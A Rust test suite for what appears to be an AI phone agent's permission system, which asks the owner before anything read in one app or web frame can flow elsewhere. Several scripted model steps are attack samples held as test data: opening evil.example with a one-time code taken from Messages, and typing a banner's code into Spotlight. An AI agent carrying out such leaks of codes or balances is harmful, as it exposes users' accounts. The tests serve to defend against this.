#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::indexing_slicing
)]
//! Seventeenth review, the corrected model end to end: embedded web content is a place of
//! its own and the relation is one-way; every model-chosen action but `wait`, `look` and the
//! final text is an input (`confirm: []` changes nothing); a launch moves the question, it
//! does not add one; a question names every place its approval allows (what does not fit is
//! asked next); a recorded step stores its place; Jarvis's own id is its exact id (twenty-fifth
//! review; it covered ids extending it before).

mod common;

use common::*;
use jarvis_agent::Session;
use jarvis_memory::MemoryStore;
use jarvis_proto::fixtures::{node, rect, screen, text, IPHONE_SIZE};
use jarvis_proto::{
    AppInfo, ConfirmVerb, Effect, Event, Observation, ParamKind, Policy, RiskCategory, Role,
    RunnerCommand, Screen, SessionConfig, TaskSpec, Tier, TimedEvent, ToolParam, ToolSpec, UiNode,
};

const FLOW: &str = "what it read there could be passed on here";
const MESSAGES: &str = "com.apple.MobileSMS";
const NOTES: &str = "com.apple.mobilenotes";
const MAPS: &str = "com.apple.Maps";
const ACME: &str = "com.example.acme";
const DONE: &str = r#"{"action":"done","summary":"ok"}"#;
const WAIT: &str = r#"{"action":"wait","ms":500}"#;

fn cfg() -> SessionConfig {
    let mut c = config();
    c.known_apps.push(AppInfo::new(NOTES, "Notes"));
    c.known_apps.push(AppInfo::new(MAPS, "Maps"));
    c.known_apps
        .push(AppInfo::new("com.apple.mobilesafari", "Safari"));
    c
}

fn scr(app: &str, name: &str, children: Vec<UiNode>) -> Screen {
    let root = UiNode::new(Role::Application, IPHONE_SIZE.to_rect())
        .with_label(name)
        .with_children(vec![
            UiNode::new(Role::Window, IPHONE_SIZE.to_rect()).with_children(children)
        ]);
    screen(app, name, root, false)
}

fn messages() -> Screen {
    scr(
        MESSAGES,
        "Messages",
        vec![
            text("Your code is 482913", rect(16.0, 140.0, 361.0, 40.0)),
            node(Role::Button, "Info", rect(16.0, 300.0, 100.0, 40.0)),
        ],
    )
}

fn plain(app: &str, name: &str) -> Screen {
    scr(
        app,
        name,
        vec![
            text(&format!("{name} home"), rect(16.0, 140.0, 361.0, 40.0)),
            UiNode::new(Role::TextField, rect(16.0, 200.0, 361.0, 40.0))
                .with_label("Body")
                .with_value("draft")
                .hittable(true),
            node(Role::Button, "OK", rect(16.0, 300.0, 100.0, 40.0)),
            node(Role::Button, "Later", rect(200.0, 300.0, 100.0, 40.0)),
        ],
    )
}

/// A screen with a text and one harmless button.
fn simple(app: &str, name: &str) -> Screen {
    scr(
        app,
        name,
        vec![
            text(&format!("{name} home"), rect(16.0, 140.0, 361.0, 40.0)),
            node(Role::Button, "Directions", rect(16.0, 300.0, 150.0, 40.0)),
        ],
    )
}

fn tap(i: u32) -> String {
    format!(r#"{{"action":"tap","element":{i}}}"#)
}

fn flows(r: &Run) -> Vec<&jarvis_proto::ConfirmRequest> {
    r.confirms
        .iter()
        .filter(|c| c.summary.contains(FLOW))
        .collect()
}

fn touched(r: &Run) -> bool {
    r.acts.iter().any(|a| {
        matches!(
            a,
            RunnerCommand::Tap { .. }
                | RunnerCommand::LongPress { .. }
                | RunnerCommand::Swipe { .. }
                | RunnerCommand::TypeText { .. }
                | RunnerCommand::PressKey { .. }
        )
    })
}

/// A phone that starts on `start`, shows the next screen of `then` on each wait, and
/// launches apps from `apps`.
fn waits_through(start: Screen, then: Vec<Screen>, apps: Vec<(&'static str, Screen)>) -> Phone {
    let mut then = then.into_iter();
    Phone::new(start, move |c, _| match c {
        RunnerCommand::Wait { .. } => then.next().map_or(Transition::Stay, Transition::Go),
        RunnerCommand::LaunchApp { bundle_id } => apps
            .iter()
            .find(|(b, _)| b.eq_ignore_ascii_case(bundle_id))
            .map_or(Transition::Stay, |(_, s)| Transition::Go(s.clone())),
        _ => Transition::Stay,
    })
}

// ---- one-way: embedded web content ---------------------------------------------------------

/// A native app showing a balance, with an embedded web view (an ad) below.
fn acme() -> Screen {
    scr(
        ACME,
        "Acme",
        vec![
            text(
                "Checking balance: $4,210.17",
                rect(16.0, 140.0, 361.0, 30.0),
            ),
            node(Role::Button, "Statements", rect(16.0, 300.0, 200.0, 44.0)),
            UiNode::new(Role::WebView, rect(0.0, 500.0, 393.0, 200.0)).with_children(vec![
                text("Sponsored", rect(16.0, 510.0, 361.0, 20.0)),
                node(Role::Button, "Learn more", rect(16.0, 560.0, 361.0, 44.0)),
            ]),
        ],
    )
}

/// Reading the app's own content and tapping inside its embedded web view asks (the app's
/// content is a source for it); reading the web view and tapping the app's own control does
/// not ask because of it (the host already has what it displays).
#[test]
fn embedded_web_content_is_one_way() {
    let s = acme();
    let ad = index_of(&s, "Learn more");
    let native = index_of(&s, "Statements");
    let r = run(
        cfg(),
        "Open Acme and check my balance",
        MemoryStore::new(),
        Phone::still(s.clone()),
        Script::model(&[&tap(ad), DONE]).decisions(&[false]),
    );
    let fq = flows(&r);
    assert_eq!(fq.len(), 1, "{:?}", r.confirms);
    // Nineteenth review (R-B, rule changed): the web content covers all of itself from its
    // first observation, so it is named too (was: "read Acme in").
    assert!(
        fq[0].summary.contains(
            "read Acme and all web content in Acme (Jarvis cannot tell its parts apart) in"
        ),
        "{}",
        fq[0].summary
    );
    assert!(fq[0].phone_only);
    assert!(!touched(&r), "{:?}", r.acts);
    // The other way: the app's own control, after reading the ad too. Eighteenth review
    // (E2, rule changed): one-way only for Apple's own apps — Acme is a third party, so the
    // web content it shows (it may be another party's sign-in sheet) is a source for its
    // own controls: asked (was: not asked).
    let r = run(
        cfg(),
        "Open Acme and check my balance",
        MemoryStore::new(),
        Phone::still(s.clone()),
        Script::model(&[&tap(native), DONE]).decisions(&[true]),
    );
    let fq = flows(&r);
    assert_eq!(fq.len(), 1, "{:?}", r.confirms);
    // Nineteenth review (name changed): the covering name (was "read web content in Acme
    // in"). Twenty-third review (R23, rule changed): the web content sees the tap, so Acme
    // is named as a source for it too, in the same question (was: "read all web content in
    // Acme (…) in").
    assert!(
        fq[0].summary.contains(
            "read Acme and all web content in Acme (Jarvis cannot tell its parts apart) in"
        ),
        "{}",
        fq[0].summary
    );
    assert!(touched(&r));
    // Nineteenth review (R-A, rule changed): an Apple app is two-way too — a native control
    // can open another party's document, which observes the open — so the tap asks once,
    // naming the web content (was: not asked).
    let mut apple = s;
    apple.app_bundle_id = "com.apple.news".into();
    let mut c = cfg();
    c.known_apps.push(AppInfo::new("com.apple.news", "News"));
    let r = run(
        c,
        "Open News and read the story",
        MemoryStore::new(),
        Phone::still(apple),
        Script::model(&[&tap(native), DONE]).decisions(&[true]),
    );
    let fq = flows(&r);
    assert_eq!(fq.len(), 1, "{:?}", r.confirms);
    // Twenty-third review (R23, rule changed): as above, Acme is named too.
    assert!(
        fq[0].summary.contains(
            // (the screen still calls itself "Acme")
            "read Acme and all web content in Acme (Jarvis cannot tell its parts apart) in"
        ),
        "{}",
        fq[0].summary
    );
    assert!(touched(&r));
}

fn framed_page() -> Screen {
    scr(
        "com.apple.mobilesafari",
        "Safari",
        vec![
            UiNode::new(Role::WebView, rect(0.0, 100.0, 393.0, 650.0)).with_children(vec![
                text("Balance $4,210.17", rect(16.0, 140.0, 361.0, 30.0)),
                node(Role::Button, "Menu", rect(16.0, 200.0, 361.0, 44.0)),
                UiNode::new(Role::WebView, rect(0.0, 400.0, 393.0, 200.0)).with_children(vec![
                    text("Support chat", rect(16.0, 405.0, 361.0, 10.0)),
                    node(Role::Button, "Chat", rect(16.0, 420.0, 361.0, 44.0)),
                ]),
            ]),
            UiNode::new(Role::Button, rect(100.0, 800.0, 200.0, 30.0))
                .with_label("Address")
                .with_value("bank.example")
                .with_identifier("TabBarItemTitle"),
        ],
    )
}

/// A frame nested in a page is a place of its own, and the relation is two-way (the page
/// does not have what a cross-origin frame shows): reading the page and tapping in the
/// frame asks, naming the site; reading the frame and tapping a page control asks, naming
/// the frame; approving one direction does not allow the other.
#[test]
fn a_frame_and_its_page_are_two_way() {
    let page = framed_page();
    let chat = index_of(&page, "Chat");
    let menu = index_of(&page, "Menu");
    let go = |taps: &[u32], decisions: &[bool]| {
        let mut script: Vec<String> = taps.iter().map(|i| tap(*i)).collect();
        script.push(DONE.to_owned());
        let refs: Vec<&str> = script.iter().map(String::as_str).collect();
        run(
            cfg(),
            "Open my bank",
            MemoryStore::new(),
            Phone::still(framed_page()),
            Script::model(&refs).decisions(decisions),
        )
    };
    // Page into frame. Twenty-third review (R23, rule changed): the page and Safari's
    // chrome see the tap, so the frame is named as a source for them in the same question
    // (was: "read bank.example in").
    let r = go(&[chat], &[false]);
    let fq = flows(&r);
    assert_eq!(fq.len(), 1, "{:?}", r.confirms);
    assert!(
        fq[0]
            .summary
            .contains("read bank.example and embedded content in bank.example in"),
        "{}",
        fq[0].summary
    );
    assert!(!touched(&r));
    assert!(
        fq[0]
            .summary
            .contains(", into embedded content in bank.example, and to "),
        "{}",
        fq[0].summary
    );
    // Frame into page. Twenty-third review (R23, rule changed): the frame and Safari's
    // chrome see the tap, so the page is named as a source for them too (was: "read
    // embedded content in bank.example in"); the input itself goes into the page.
    let r = go(&[menu], &[false]);
    let fq = flows(&r);
    assert_eq!(fq.len(), 1, "{:?}", r.confirms);
    assert!(
        fq[0]
            .summary
            .contains("read bank.example and embedded content in bank.example in"),
        "{}",
        fq[0].summary
    );
    assert!(
        fq[0].summary.contains(", into bank.example, and to "),
        "{}",
        fq[0].summary
    );
    assert!(!touched(&r));
    // Approving page → frame does not allow frame → page.
    let r = go(&[chat, menu], &[true, false]);
    let fq = flows(&r);
    assert_eq!(fq.len(), 2, "{:?}", r.confirms);
    assert!(fq[1].summary.contains("embedded content in bank.example"));
    assert_eq!(
        r.acts
            .iter()
            .filter(|a| matches!(a, RunnerCommand::Tap { .. }))
            .count(),
        1,
        "{:?}",
        r.acts
    );
}

// ---- a launch moves the question --------------------------------------------------------------

/// `open_app Maps` after reading Messages asks once; the first touch in Maps does not ask
/// again for the same sources.
#[test]
fn a_launch_asks_once_and_the_first_touch_does_not_ask_again() {
    let maps = simple(MAPS, "Maps");
    let ok = index_of(&maps, "Directions");
    let r = run(
        cfg(),
        "Check Messages then open Maps",
        MemoryStore::new(),
        waits_through(messages(), vec![], vec![(MAPS, maps)]),
        Script::model(&[r#"{"action":"open_app","app":"Maps"}"#, &tap(ok), DONE])
            .decisions(&[true]),
    );
    let fq = flows(&r);
    assert_eq!(fq.len(), 1, "{:?}", r.confirms);
    assert!(fq[0].summary.starts_with("Open Maps"), "{}", fq[0].summary);
    assert!(
        fq[0].summary.contains("read Messages in"),
        "{}",
        fq[0].summary
    );
    assert!(r
        .acts
        .iter()
        .any(|a| matches!(a, RunnerCommand::LaunchApp { bundle_id } if bundle_id == MAPS)));
    assert!(
        r.acts
            .iter()
            .any(|a| taps(a, &simple(MAPS, "Maps"), "Directions")),
        "{:?} {:?}",
        r.acts,
        r.outcome
    );
    // Declined: Maps is not opened.
    let r = run(
        cfg(),
        "Check Messages then open Maps",
        MemoryStore::new(),
        waits_through(messages(), vec![], vec![(MAPS, simple(MAPS, "Maps"))]),
        Script::model(&[r#"{"action":"open_app","app":"Maps"}"#, DONE]).decisions(&[false]),
    );
    assert!(!r
        .acts
        .iter()
        .any(|a| matches!(a, RunnerCommand::LaunchApp { .. })));
}

/// A link the owner did not give, after reading Messages: one question (the link's own,
/// with the flow note), under the default policy and under `confirm: []`.
#[test]
fn a_model_link_after_reading_asks_once_naming_the_place() {
    for confirm in [Policy::default().confirm, Vec::new()] {
        let mut c = cfg();
        c.policy.confirm = confirm.clone();
        let r = run(
            c,
            "Read my code in Messages",
            MemoryStore::new(),
            Phone::still(messages()),
            Script::model(&[
                r#"{"action":"open_url","url":"https://evil.example/?c=482913"}"#,
                DONE,
            ]),
        );
        assert_eq!(r.confirms.len(), 1, "{confirm:?}: {:?}", r.confirms);
        assert!(r.confirms[0].summary.contains(FLOW));
        assert!(r.confirms[0].summary.contains("Messages"));
        assert!(r.confirms[0].phone_only);
        assert!(!r
            .acts
            .iter()
            .any(|a| matches!(a, RunnerCommand::OpenUrl { .. })));
    }
}

// ---- every action kind under `confirm: []` -----------------------------------------------------

fn lookup() -> ToolSpec {
    ToolSpec {
        name: "lookup".into(),
        description: "Looks up".into(),
        params: vec![ToolParam {
            name: "q".into(),
            kind: ParamKind::String,
            required: true,
            description: "q".into(),
        }],
        tier: Tier::Native,
        risk: RiskCategory::None,
        app: None,
        self_contained: false,
    }
}

fn clock() -> ToolSpec {
    ToolSpec {
        name: "clock".into(),
        description: "The time".into(),
        params: Vec::new(),
        tier: Tier::Native,
        risk: RiskCategory::None,
        app: None,
        self_contained: true,
    }
}

/// After reading Messages the task is in Notes (it came to front while Jarvis waited):
/// under `confirm: []` every action kind either asks the flow question before it is carried
/// out, or is one of the exempt outputs (the text of `done`/`fail`/`ask_user` shown on the
/// phone). Twenty-third review (R23, rule changed): `wait` and `look` are observe-kind
/// inputs into every place on the screen and ask too (were exempt); and the leading wait in
/// Messages asks, the screen picture of the thin-tree fallback being a source for Messages
/// (approved below, so the task reaches Notes as before).
#[test]
fn every_action_kind_asks_under_confirm_nothing_or_is_exempt() {
    let notes = plain(NOTES, "Notes");
    let ok = index_of(&notes, "OK");
    let body = index_of(&notes, "Body");
    let inputs: Vec<(&str, Vec<String>)> = vec![
        ("tap", vec![tap(ok)]),
        (
            "long_press",
            vec![format!(r#"{{"action":"long_press","element":{ok}}}"#)],
        ),
        (
            "type",
            vec![format!(
                r#"{{"action":"type","element":{body},"text":"hello"}}"#
            )],
        ),
        (
            "type_submit",
            vec![format!(
                r#"{{"action":"type","element":{body},"text":"hello","submit":true}}"#
            )],
        ),
        (
            "clear",
            vec![format!(r#"{{"action":"clear","element":{body}}}"#)],
        ),
        (
            "scroll",
            vec![r#"{"action":"scroll","direction":"down"}"#.to_owned()],
        ),
        (
            "swipe",
            vec![format!(
                r#"{{"action":"swipe","direction":"left","element":{ok}}}"#
            )],
        ),
        (
            "tap_point",
            vec![
                r#"{"action":"look"}"#.to_owned(),
                r#"{"action":"tap_point","x":0.2,"y":0.37}"#.to_owned(),
            ],
        ),
        ("press_home", vec![r#"{"action":"press_home"}"#.to_owned()]),
        (
            "open_app",
            vec![r#"{"action":"open_app","app":"Maps"}"#.to_owned()],
        ),
        (
            "open_url_owner",
            vec![r#"{"action":"open_url","url":"https://news.example/"}"#.to_owned()],
        ),
        (
            "open_url_model",
            vec![r#"{"action":"open_url","url":"https://evil.example/"}"#.to_owned()],
        ),
        (
            "call_tool_args",
            vec![r#"{"action":"call_tool","name":"lookup","args":{"q":"hello"}}"#.to_owned()],
        ),
        (
            "call_tool_no_args",
            vec![r#"{"action":"call_tool","name":"clock","args":{}}"#.to_owned()],
        ),
    ];
    let mut inputs = inputs;
    inputs.push(("wait", vec![WAIT.to_owned()]));
    inputs.push(("look", vec![r#"{"action":"look"}"#.to_owned()]));
    let exempt: Vec<(&str, Vec<String>)> = vec![
        (
            "ask_user",
            vec![r#"{"action":"ask_user","question":"Which one?"}"#.to_owned()],
        ),
        (
            "fail",
            vec![r#"{"action":"fail","reason":"cannot"}"#.to_owned()],
        ),
    ];
    let go = |steps: &[String], decisions: &[bool]| {
        let mut c = vision_config();
        c.known_apps.push(AppInfo::new(NOTES, "Notes"));
        c.known_apps.push(AppInfo::new(MAPS, "Maps"));
        c.policy.confirm = Vec::new();
        c.tools = vec![lookup(), clock()];
        let mut script: Vec<String> = vec![WAIT.to_owned()];
        script.extend(steps.iter().cloned());
        script.push(DONE.to_owned());
        let refs: Vec<&str> = script.iter().map(String::as_str).collect();
        run(
            c,
            "Check Messages, then hello in Notes and https://news.example/",
            MemoryStore::new(),
            waits_through(
                messages(),
                vec![plain(NOTES, "Notes")],
                vec![(MAPS, plain(MAPS, "Maps"))],
            ),
            Script::model(&refs).decisions(decisions),
        )
    };
    // The places a flow question names as read.
    let read = |q: &jarvis_proto::ConfirmRequest| {
        let from = q.summary.find("Jarvis has read ").unwrap_or(0);
        let to = q.summary.find(" in this task;").unwrap_or(from);
        q.summary.get(from..to).unwrap_or_default().to_owned()
    };
    for (kind, steps) in &inputs {
        // The leading wait's question is approved; so is the look before a `tap_point` (it
        // asks too, R23), so that the `tap_point` itself is decided.
        let decisions: &[bool] = if *kind == "tap_point" {
            &[true, true]
        } else {
            &[true]
        };
        let r = go(steps, decisions);
        let fq = flows(&r);
        assert!(
            fq.len() >= 2,
            "{kind}: not asked: {:?} {:?}",
            r.acts,
            r.confirms
        );
        assert!(
            fq[0].summary.starts_with("Wait"),
            "{kind}: {}",
            fq[0].summary
        );
        let q = fq.last().unwrap();
        assert!(read(q).contains("Messages"), "{kind}: {}", q.summary);
        // Declined: nothing of it was carried out.
        assert!(!touched(&r), "{kind}: {:?}", r.acts);
        assert!(
            !r.acts.iter().any(|a| matches!(
                a,
                RunnerCommand::LaunchApp { .. } | RunnerCommand::OpenUrl { .. }
            )),
            "{kind}: {:?}",
            r.acts
        );
        assert!(r.tool_calls.is_empty(), "{kind}: {:?}", r.tool_calls);
    }
    for (kind, steps) in &exempt {
        let r = go(steps, &[true]);
        // Only the leading wait's question.
        assert_eq!(flows(&r).len(), 1, "{kind}: {:?}", r.confirms);
    }
}

// ---- what an approval allows ---------------------------------------------------------------

/// Six places read, with names too long to fit one question: the first question names the
/// five read most recently and allows only them; the sixth (read first) is asked next, by
/// name, before anything is sent. Declined, nothing is sent.
#[test]
fn every_place_an_approval_allows_is_named() {
    // Enough long names that one question cannot name them all.
    const N: usize = 6;
    let apps: Vec<(String, String)> = (0..N)
        .map(|i| {
            (
                format!("com.example.long{i}"),
                format!("Application With A Very Long Name Number {i}"),
            )
        })
        .collect();
    let screens: Vec<Screen> = apps.iter().map(|(b, n)| plain(b, n)).collect();
    let target = plain(NOTES, "Notes");
    let ok = index_of(&target, "OK");
    let go = |decisions: &[bool]| {
        let mut c = cfg();
        for (b, n) in &apps {
            c.known_apps.push(AppInfo::new(b, n));
        }
        let mut then: Vec<Screen> = screens[1..].to_vec();
        then.push(target.clone());
        run(
            c,
            "Check my apps then tap OK in Notes",
            MemoryStore::new(),
            waits_through(screens[0].clone(), then, vec![]),
            Script::model(&[WAIT, WAIT, WAIT, WAIT, WAIT, WAIT, &tap(ok), DONE])
                .decisions(decisions),
        )
    };
    // Twenty-third review (R23, rule changed): every wait after the first is seen by the app
    // in front, which was given none of the apps read before, so it asks (observe kind).
    // Those questions are approved here (an observe grant never covers the tap); what is
    // asserted is about the tap's questions.
    let waits = flows(&go(&[true; 40]))
        .iter()
        .filter(|q| q.verb != ConfirmVerb::Tap)
        .count();
    assert!(waits >= 5, "{waits}");
    let go = |decisions: &[bool]| {
        let mut all = vec![true; waits];
        all.extend_from_slice(decisions);
        go(&all)
    };
    let flows = |r: &Run| -> Vec<jarvis_proto::ConfirmRequest> {
        flows(r)
            .into_iter()
            .filter(|q| q.verb == ConfirmVerb::Tap)
            .cloned()
            .collect()
    };
    let first = "Number 0";
    let r = go(&[true, false]);
    let fq = flows(&r);
    assert_eq!(fq.len(), 2, "{:?}", r.confirms);
    assert!(!fq[0].summary.contains(first), "{}", fq[0].summary);
    assert!(
        fq[0].summary.contains("Jarvis asks about them next"),
        "{}",
        fq[0].summary
    );
    for i in 1..N {
        let n = format!("Number {i}");
        assert!(fq[0].summary.contains(&n), "{}", fq[0].summary);
    }
    assert!(fq[1].summary.contains(first), "{}", fq[1].summary);
    assert!(!touched(&r), "{:?}", r.acts);
    // Both approved: the tap goes out once.
    let r = go(&[true, true]);
    assert_eq!(flows(&r).len(), 2);
    assert_eq!(
        r.acts
            .iter()
            .filter(|a| matches!(a, RunnerCommand::Tap { .. }))
            .count(),
        1
    );
}

// ---- learned flows record their place ------------------------------------------------------

/// A recorded step stores the place its input went to (app and site), so a replay can tell
/// whether it runs where it was recorded.
#[test]
fn recorded_steps_store_their_place() {
    let notes = simple(NOTES, "Notes");
    let go = index_of(&notes, "Directions");
    let r = run(
        cfg(),
        "Show directions in Notes",
        MemoryStore::new(),
        Phone::new(notes, |_, _| Transition::Go(simple(NOTES, "Directions"))),
        Script::model(&[&tap(go), DONE]),
    );
    let flow = r.memory.flows.flows().first().expect("a learned flow");
    assert_eq!(
        flow.steps[0].place.as_deref(),
        Some("app:com.apple.mobilenotes")
    );
}

// ---- Jarvis's own id is an OS fact -----------------------------------------------------------

/// Jarvis's own app (its exact id) is a stub, and the progress says its screen is hidden; a
/// look-alike id is not. Twenty-fifth review: an id that extends Jarvis's with a `.` suffix
/// and the id in another case are look-alikes too (the own ids are an exact list).
#[test]
fn own_app_is_its_exact_id() {
    for (app, own) in [
        ("dev.jarvis.app", true),
        ("dev.jarvis.app.widgets", false),
        ("DEV.Jarvis.App", false),
        ("dev.jarvis.application", false),
    ] {
        let mut c = cfg();
        c.agent_bundle_ids = vec!["dev.jarvis.app".into()];
        let mut s = Session::new(c, TaskSpec::new("t", "x"), MemoryStore::new());
        let _ = s.step(TimedEvent::new(1, Event::Start));
        let e = s.step(TimedEvent::new(
            2,
            Event::Observed(Observation {
                screen: plain(app, "Jarvis"),
                screenshot: None,
                device_locked: false,
            }),
        ));
        let Effect::Infer(req) = e else {
            panic!("{e:?}")
        };
        assert_eq!(
            req.user.contains("Jarvis's own app is in front"),
            own,
            "{app}"
        );
        assert_eq!(s.progress().screen_hidden, own, "{app}");
    }
}

// ---- home-screen launches ------------------------------------------------------------------

fn springboard(extra: Vec<UiNode>) -> Screen {
    let mut kids = vec![
        node(Role::Button, "Settings", rect(20.0, 120.0, 72.0, 72.0)).with_identifier("Settings"),
        node(Role::Button, "Maps", rect(112.0, 120.0, 72.0, 72.0)).with_identifier("Maps"),
    ];
    kids.extend(extra);
    scr("com.apple.springboard", " ", kids)
}

fn banner() -> UiNode {
    UiNode::new(
        Role::Other("NotificationBanner".into()),
        rect(8.0, 50.0, 377.0, 60.0),
    )
    .with_children(vec![text(
        "Bank: your code is 482913",
        rect(16.0, 60.0, 300.0, 20.0),
    )])
}

/// Condition (a): after a banner was read on the home screen, text typed into Spotlight
/// still goes through R1 — a text that is not the owner's asks on the phone, and a decline
/// types nothing (the home screen's own content not being a source for the launch changes
/// nothing about it).
#[test]
fn spotlight_typing_after_a_banner_still_asks_for_text_not_the_owners() {
    let home = springboard(vec![
        banner(),
        UiNode::new(Role::SearchField, rect(16.0, 700.0, 361.0, 40.0))
            .with_label("Search")
            .focused(true)
            .hittable(true),
    ]);
    let field = index_of(&home, "Search");
    let r = run(
        cfg(),
        "Open the weather app",
        MemoryStore::new(),
        Phone::still(home),
        Script::model(&[
            &format!(r#"{{"action":"type","element":{field},"text":"482913","submit":true}}"#),
            DONE,
        ]),
    );
    assert!(!r.confirms.is_empty(), "{:?}", r.acts);
    let q = &r.confirms[0];
    assert!(q.phone_only, "{q:?}");
    assert!(
        q.summary.contains("This text is not from your request"),
        "{}",
        q.summary
    );
    assert!(
        !r.acts
            .iter()
            .any(|a| matches!(a, RunnerCommand::TypeText { .. })),
        "{:?}",
        r.acts
    );
}

/// The exemption is the home screen's (SpringBoard, by bundle id): a launch from it after a
/// banner was read asks nothing at the launch, and the first input into the app it opened
/// asks, naming the home screen. An app that draws a look-alike home screen gets no
/// exemption: its "icon" is a tap into that app, and its own content is a source for the
/// app it opens like any other.
#[test]
fn the_launch_exemption_is_springboards_only() {
    let settings = simple("com.apple.Preferences", "Settings");
    let go_on = index_of(&settings, "Directions");
    let launcher = |bundle: &str| {
        let mut s = springboard(vec![banner()]);
        s.app_bundle_id = bundle.to_owned();
        s
    };
    for (bundle, real) in [
        ("com.apple.springboard", true),
        ("com.example.launcher", false),
    ] {
        let start = launcher(bundle);
        let icon = index_of(&start, "Settings");
        let s2 = settings.clone();
        let r = run(
            cfg(),
            "Open Settings and show directions",
            MemoryStore::new(),
            Phone::new(start, move |c, _| match c {
                RunnerCommand::Tap { .. } | RunnerCommand::LaunchApp { .. } => {
                    Transition::Go(s2.clone())
                }
                _ => Transition::Stay,
            }),
            Script::model(&[&tap(icon), &tap(go_on), DONE]).decisions(&[true, true]),
        );
        let fq = flows(&r);
        assert_eq!(fq.len(), 1, "{bundle}: {:?}", r.confirms);
        if real {
            // Asked at the first input into Settings, naming the home screen.
            assert_eq!(fq[0].app, "com.apple.Preferences", "{:?}", fq[0]);
            assert!(
                fq[0].summary.contains("the Home Screen"),
                "{}",
                fq[0].summary
            );
        } else {
            // The look-alike is an app like any other: its content is a source for Settings
            // (asked at the first input there, naming it), and its "icon" tap was an input
            // into itself (nothing else read: not asked).
            assert_eq!(fq[0].app, "com.apple.Preferences", "{:?}", fq[0]);
            assert!(
                fq[0].summary.contains("com.example.launcher"),
                "{}",
                fq[0].summary
            );
        }
    }
}
